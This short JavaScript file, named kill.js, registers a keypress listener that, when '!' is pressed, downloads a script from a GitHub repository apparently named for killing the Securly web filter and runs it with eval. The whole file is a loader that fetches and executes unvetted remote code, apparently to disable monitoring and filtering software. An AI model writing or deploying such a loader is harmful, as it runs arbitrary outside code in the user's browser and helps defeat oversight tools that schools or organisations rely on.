/// kill.js
document.addEventListener("keydown", function (e) {
  if (e.key == "!") {
    fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r))
  }
});
